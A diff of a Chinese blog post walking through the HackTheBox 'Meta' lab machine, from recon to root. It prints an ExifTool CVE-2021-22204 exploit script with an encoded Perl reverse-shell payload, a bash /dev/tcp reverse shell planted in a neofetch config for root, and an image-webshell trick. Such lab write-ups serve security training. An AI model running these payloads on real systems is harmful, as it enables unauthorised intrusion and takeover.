@@ -16,15 +16,14 @@
   <meta name="author" content="Dar3n1y">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Machines（Meta） 信息搜集使用masscan扫描全端口 1sudo masscan -p1-65535 10.10.11.140 --rate&#x3D;1000   使用nmap扫描常用端口 1nmap -A -sV 10.10.11.140    从扫描结果看出开放了22和80端口  访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单">
+    <meta name="description" content="HackThebox是国外的一款靶场渗透在线平台，本文详细记录了Meta靶场渗透测试的过程，难度较难，其中包含了CVE-2021-22204-exiftool、ImageMgick命令注入、提权等内容。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-Meta">
-<meta property="og:url" content="http://example.com/2022/03/05/HackTheBox-Meta/index.html">
+<meta property="og:url" content="https://dar3n1y.top/2022/03/05/HackTheBox-Meta/index.html">
 <meta property="og:site_name" content="Dar3n1y&#39;s Blog">
-<meta property="og:description" content="Machines（Meta） 信息搜集使用masscan扫描全端口 1sudo masscan -p1-65535 10.10.11.140 --rate&#x3D;1000   使用nmap扫描常用端口 1nmap -A -sV 10.10.11.140    从扫描结果看出开放了22和80端口  访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单">
+<meta property="og:description" content="HackThebox是国外的一款靶场渗透在线平台，本文详细记录了Meta靶场渗透测试的过程，难度较难，其中包含了CVE-2021-22204-exiftool、ImageMgick命令注入、提权等内容。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-2323.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png">
@@ -42,12 +41,12 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png">
 <meta property="article:published_time" content="2022-03-05T14:12:51.174Z">
-<meta property="article:modified_time" content="2022-04-17T10:52:31.349Z">
+<meta property="article:modified_time" content="2022-04-17T15:44:37.676Z">
 <meta property="article:author" content="Dar3n1y">
 <meta property="article:tag" content="HackTheBox">
-<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="靶机系列">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-2323.png">
   
   
   <title>HackTheBox-Meta - Dar3n1y&#39;s Blog</title>
@@ -87,7 +86,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"dar3n1y.top","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -102,7 +101,7 @@
   <header>
     
 
-<div class="header-inner" style="height: 70vh;">
+<div class="header-inner" style="height: 45vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
@@ -241,7 +240,7 @@
         
         
         
-          90 mins
+          91 mins
         
       </span>
     
@@ -291,49 +290,53 @@
             
             <div class="markdown-body">
               
-              <h3 id="Machines（Meta）"><a href="#Machines（Meta）" class="headerlink" title="Machines（Meta）"></a>Machines（Meta）</h3><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131.png" srcset="/img/loading.gif" lazyload alt="image-20220305133205477"></p>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>使用masscan扫描全端口</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.11.140</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure>
+              <blockquote>
+<p>HackThebox是国外的一款靶场渗透在线平台，本文详细记录了Meta靶场渗透测试的过程，难度较难，其中包含了CVE-2021-22204-exiftool、ImageMgick命令注入、提权等内容。</p>
+</blockquote>
+<span id="more"></span>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-1.png" srcset="/img/loading.gif" lazyload alt="image-20220305154950771"></p>
-<p>使用nmap扫描常用端口</p>
+<h3 id="0x01-Meta"><a href="#0x01-Meta" class="headerlink" title="0x01 Meta"></a>0x01 Meta</h3><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-2323.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="0x02-信息搜集"><a href="#0x02-信息搜集" class="headerlink" title="0x02 信息搜集"></a>0x02 信息搜集</h3><p>神器nmap扫描常用端口</p>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -<span class="hljs-keyword">A</span> -sV <span class="hljs-number">10.10.11.140</span>  <br></code></pre></td></tr></table></figure>
 
 <p>从扫描结果看出开放了22和80端口</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png" srcset="/img/loading.gif" lazyload alt="image-20220305154437331"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>访问80端口，发现重定向一个网址名为artcorp.htb的网址，修改hosts文件绑定域名，可见是一个简单的门户网站</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png" srcset="/img/loading.gif" lazyload alt="image-20220305152919577"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-3.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>发现该网站没有其他功能入口，w-w 顺手拿起大佬的脚本跑一边站点目录，看有没有好东西</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png" srcset="/img/loading.gif" lazyload alt="image-20220305153310734"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>嗯。。。无，再跑下子域名</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -c -w <span class="hljs-string">&#x27;/media/psf/Home/Data/Dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt&#x27;</span> -u http:<span class="hljs-regexp">//</span>artcorp.htb/ -H <span class="hljs-string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -mc <span class="hljs-number">200</span> <br></code></pre></td></tr></table></figure>
 
 <p>发现存在dev01.artcorp.htb子域名</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-5.png" srcset="/img/loading.gif" lazyload alt="image-20220305162607984"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-5.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>在hosts中绑定子域名，访问域名有东西，是一个开发测试的环境</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-6.png" srcset="/img/loading.gif" lazyload alt="image-20220305170234261"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-6.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>点击MetaView，发现一个文件上传的功能点Upload</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-7.png" srcset="/img/loading.gif" lazyload alt="image-20220305170542626"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-7.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>我们可以知道这是一个php的站点，先直接上传一个后缀为php的木马，提示不被允许</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-8.png" srcset="/img/loading.gif" lazyload alt="image-20220305172737257"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-8.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>通过简单测试发现系统应该是校验了上传文件的头字节来判断是否是允许的图片格式</p>
 <p>直接制作图片马</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cat <span class="hljs-number">123</span><span class="hljs-selector-class">.jpeg</span> eval<span class="hljs-selector-class">.php</span> &gt; eval123.php<br></code></pre></td></tr></table></figure>
 
 <p>再次上传成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-9.png" srcset="/img/loading.gif" lazyload alt="image-20220305173235653"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-9.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>这里找了没有上传文件保存路径，随便测了几个常规文件保存路径，无果放弃！（应该在早点注意这个条件的，扎心了…）</p>
 <p>回到上传成功的页面，查看图片列出的属性信息格式，搜索发现这是一个exiftool的cve漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-10.png" srcset="/img/loading.gif" lazyload alt="image-20220315233405370"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-10.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>上传图片返回的图片属性</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-11.png" srcset="/img/loading.gif" lazyload alt="image-20220305191009798"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-11.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>（做到这里突然Kali直接无界面了，怎么重启都一样，卡了很久，还有网上搜索姿势要对，废了好长时间才找到了大佬的解决办法！！！）</p>
 <p>继续……</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​	<strong>ExifTool 7.44至12.23在DjVu模块中存在一个错误，该错误允许在解析恶意图像时执行任意代码</strong></p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>​	<strong>ExifTool 7.44至12.23在DjVu模块中存在一个错误，该错误允许在解析恶意图像时执行任意代码</strong></p>
 <blockquote>
 <p>Exp</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/OneSecCyber/JPEG_RCE">https://github.com/OneSecCyber/JPEG_RCE</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a></p>
 </blockquote>
 <p>把第二个链接下载下来,更改exploit.py中的地址和端口</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><br>ip = <span class="hljs-string">&#x27;10.10.11.17&#x27;</span> //修改成自己的地址<br>port = <span class="hljs-string">&#x27;9090&#x27;</span>	//准备监听的端口<br><br>payload = <span class="hljs-string">b&quot;(metadata \&quot;\c$&#123;use MIME::Base64;eval(decode_base64(&#x27;&quot;</span><br><br><br>payload = payload + base64.b64encode( <span class="hljs-string">f&quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#x27;tcp&#x27;));if(connect(S,sockaddr_in(<span class="hljs-subst">&#123;port&#125;</span>,inet_aton(&#x27;<span class="hljs-subst">&#123;ip&#125;</span>&#x27;))))&#123;&#123;open(STDIN,&#x27;&gt;&amp;S&#x27;);open(STDOUT,&#x27;&gt;&amp;S&#x27;);open(STDERR,&#x27;&gt;&amp;S&#x27;);exec(&#x27;/bin/sh -i&#x27;);&#125;&#125;;&quot;</span>.encode() )<br><br>payload = payload + <span class="hljs-string">b&quot;&#x27;))&#125;;\&quot;)&quot;</span><br><br><br>payload_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>payload_file.write(payload.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>payload_file.close()<br><br><br>subprocess.run([<span class="hljs-string">&#x27;bzz&#x27;</span>, <span class="hljs-string">&#x27;payload&#x27;</span>, <span class="hljs-string">&#x27;payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;djvumake&#x27;</span>, <span class="hljs-string">&#x27;exploit.djvu&#x27;</span>, <span class="hljs-string">&quot;INFO=1,1&quot;</span>, <span class="hljs-string">&#x27;BGjp=/dev/null&#x27;</span>, <span class="hljs-string">&#x27;ANTz=payload.bzz&#x27;</span>])<br>subprocess.run([<span class="hljs-string">&#x27;exiftool&#x27;</span>, <span class="hljs-string">&#x27;-config&#x27;</span>, <span class="hljs-string">&#x27;configfile&#x27;</span>, <span class="hljs-string">&#x27;-HasselbladExif&lt;=exploit.djvu&#x27;</span>, <span class="hljs-string">&#x27;image.jpg&#x27;</span>]) <br></code></pre></td></tr></table></figure>
@@ -344,24 +347,24 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 exploit.py<br></code></pre></td></tr></table></figure>
 
 <p>(这里需要提前 <strong>sudo apt install djvulibre-bin exiftool</strong>)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-12.png" srcset="/img/loading.gif" lazyload alt="image-20220315190242037"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-12.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>然后再开一个终端 使用nc监听9090 </p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 9090<br></code></pre></td></tr></table></figure>
 
 <p>上传新生成的image.jpg </p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-13.png" srcset="/img/loading.gif" lazyload alt="image-20220315192328974"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-13.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>可以发现shell回连成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-14.png" srcset="/img/loading.gif" lazyload alt="image-20220315192525596"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-14.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>简单查看系统信息(是一个www-data用户)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-15.png" srcset="/img/loading.gif" lazyload alt="image-20220315193045328"></p>
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看&#x2F;etc&#x2F;passwd中可登录的用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-15.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>查看&#x2F;etc&#x2F;passwd中可登录的用户</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep /bin/bash</span><br>root:x:0:0:root:/root:/bin/bash<br>thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash<br></code></pre></td></tr></table></figure>
 
 <h5 id="User-thomas"><a href="#User-thomas" class="headerlink" title="User (thomas)"></a>User (thomas)</h5><p>​		目的是为了拿到&#x2F;home&#x2F;thomas&#x2F;user.txt中的flag</p>
 <p>切换&#x2F;bin&#x2F;bash</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png" srcset="/img/loading.gif" lazyload alt="image-20220315195923497"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-16.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>发现User用户下存在.ssh,但是无权限查看</p>
 <p>查看从时间2022-01-01以来创建的新文件,找到一个脚本文件(参考的大佬的思路,这个不好找啊,另外一种就是上传<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0">pspy小工具</a>)</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/home/thomas$ find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>find /usr/ -type f -newermt &#x27;2022-01-01&#x27; -ls<br>   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh<br></code></pre></td></tr></table></figure>
@@ -374,7 +377,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/usr/local/bin$ mogrify -version<br>mogrify -version<br>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br>Copyright: © 1999-2020 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a> (师傅推荐)</p>
+<p><a target="_blank" rel="noopener" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a> </p>
 <p><a target="_blank" rel="noopener" href="https://imagetragick.com/">https://imagetragick.com/</a></p>
 </blockquote>
 <p>最好是通过上传一个poc.svg到&#x2F;etc&#x2F;shm下(这里我比较废,试了直接在shell里面vi写无法保存——shell太烂了,试了echo写无权限,试了scp连不上本机,最后通过wget下载的^_^早干嘛去了……)</p>
@@ -409,7 +412,7 @@
 <p>在文件中添加</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.39/4444 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png" srcset="/img/loading.gif" lazyload alt="截屏2022-04-16 20.19.53"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>设置XDG_CONFIG_HOME变量</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> XDG_CONFIG_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config&quot;</span><br></code></pre></td></tr></table></figure>
 
@@ -422,14 +425,14 @@
 <p>获取root权限</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(parallels㉿kali-linux-2021-3)-[~/Desktop]<br>└─$ nc -lvvp 4444                                                                                           1 ⨯<br>listening on [any] 4444 ...<br>connect to [10.10.14.39] from artcorp.htb [10.10.11.140] 45348<br>root@meta:/home/thomas<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>root@meta:/home/thomas<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@meta:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>conf<br>root.txt<br>root@meta:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>11df04949c30506126899e46fd5245d8<br></code></pre></td></tr></table></figure>
 
-<h3 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h3><ol>
+<h3 id="0x05-知识小结"><a href="#0x05-知识小结" class="headerlink" title="0x05 知识小结"></a>0x05 知识小结</h3><ol>
 <li>绑定hosts</li>
 <li>Fuzz资产(ffuf工具)</li>
 <li>文件上传解析漏洞(CVE-2021-22204-exiftool)拿shell</li>
-<li>检索文件利用ImageMgick的命令注入提权user</li>
+<li>检索文件利用ImageMgick命令注入提权user</li>
 <li>neofetch提root</li>
+<li>一个好工具rlwrap，可以在shell里面上下翻动和删除</li>
 </ol>
-<p>发现一个好工具rlwrap,可以在shell里面来回翻</p>
 
               
             </div>
@@ -464,7 +467,7 @@
       
         <a href="/tags/HackTheBox/">#HackTheBox</a>
       
-        <a href="/tags/%E9%9D%B6%E6%9C%BA/">#靶机</a>
+        <a href="/tags/%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/">#靶机系列</a>
       
     </div>
   
@@ -477,7 +480,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>HackTheBox-Meta</div>
-      <div>http://example.com/2022/03/05/HackTheBox-Meta/</div>
+      <div>https://dar3n1y.top/2022/03/05/HackTheBox-Meta/</div>
     </div>
     <div class="license-meta">
       
@@ -519,9 +522,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/05/%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%BF%87%E7%A8%8B%E4%B8%ADKali%E9%87%8D%E5%90%AF%E6%97%A0%E5%9B%BE%E5%BD%A2GUI%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" title="一次打靶过程中Kali重启无图形GUI解决方法">
+                      <a href="/2022/03/05/Kali%E9%87%8D%E5%90%AF%E6%97%A0%E5%9B%BE%E5%BD%A2GUI%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" title="Kali重启无图形GUI解决方法">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一次打靶过程中Kali重启无图形GUI解决方法</span>
+                        <span class="hidden-mobile">Kali重启无图形GUI解决方法</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -529,8 +532,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/25/Hexo-Github-Pages%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/" title="Hexo+Github Pages部署博客系统">
-                        <span class="hidden-mobile">Hexo+Github Pages部署博客系统</span>
+                      <a href="/2022/01/25/GitHub%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="GitHub Pages + Hexo搭建个人博客">
+                        <span class="hidden-mobile">GitHub Pages + Hexo搭建个人博客</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
